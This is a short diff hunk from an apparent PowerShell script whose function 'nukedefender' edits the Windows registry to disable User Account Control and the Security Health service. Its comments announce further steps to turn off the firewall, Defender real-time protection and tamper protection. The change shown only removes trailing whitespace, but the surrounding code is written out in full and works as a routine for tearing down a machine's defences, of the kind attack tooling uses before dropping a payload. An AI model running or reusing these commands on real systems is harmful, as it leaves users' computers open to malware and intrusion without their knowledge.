@@ -17,7 +17,7 @@ function nukedefender {
   
     # DISABLE UAC, FIREWALL, DEFENDER
     write-host("`n  [++] Nuking Defender")
-    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v EnableLUA /t REG_DWORD /d 0 > $null 
+    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v EnableLUA /t REG_DWORD /d 0 > $null
     reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f > $null
   
     # DISABLE DEFENDER RTP, TAMPER PROTECTIONS
